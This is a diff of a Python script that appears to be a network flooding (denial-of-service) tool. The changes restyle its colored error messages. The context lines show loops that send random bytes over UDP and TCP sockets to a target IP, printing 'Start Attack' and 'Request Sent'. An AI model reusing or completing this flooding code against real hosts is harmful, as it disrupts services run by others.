@@ -84,11 +84,11 @@ def run():
 				s.sendto(data,addr)
 			print("\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
 		except:
-			print("[!] Error!")
+			print("\033[33m[\033[95m-\033[33m] Error!")
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[x]"))
+	i = random.choice(("[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -99,7 +99,7 @@ def run2():
 			print("\033[95m[\033[97m+\033[95m]  \033[31mStart Attack :::..." +ip+ " \033[0m")
 		except:
 			s.close()
-			print("[+] Error!")
+			print("\033[33m[\033[95m-\033[33m] Error!")
             
 
 def run3():
@@ -115,7 +115,7 @@ def run3():
 			print("\033[95m[\033[97m+\033[95m]   \033[92mStatus Sent ::::..." +ip+ " \033[0m")
 		except:
 			s.close()
-			print("[*] Error!")
+			print("\033[33m[\033[95m-\033[33m] Error!")
             
   
 def run4():
@@ -131,7 +131,7 @@ def run4():
 			print("\033[95m[\033[97m+\033[95m]  \033[91mRequest Sent :::..  " +ip+ " \033[0m")
 		except:
 			s.close()
-			print("[+] Error!")
+			print("\033[33m[\033[95m-\033[33m] Error!")
 											
             
 for y in range(threads):
